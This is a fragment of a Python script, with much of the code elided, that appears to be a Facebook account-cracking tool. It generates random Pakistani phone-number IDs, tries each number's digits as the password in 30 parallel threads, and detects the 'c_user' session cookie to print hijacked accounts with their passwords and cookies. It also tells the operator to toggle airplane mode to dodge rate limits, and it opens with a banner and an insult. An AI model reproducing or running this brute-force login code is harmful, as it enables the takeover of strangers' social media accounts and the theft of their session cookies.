...
.8P  Y8. .8P  Y8. .8P  Y8. 
YP    YP YP    YP YP    YP 
😂 MANY TERA NAAM GANDU RAKH DIYA 😂                                                      
\033[1;37m=============================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mXXX\33[0;m\033[1;32m && \033[1;33mXXX\33[0;m
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[XXX-OK] '+cid+' | '+ps)
				cek_apk(coki)
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[XXX-CP] '+cid+' | '+ps)
				...
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[XXX-XXX]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [CP][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] XXX Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ XXX ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
menu_apikey()
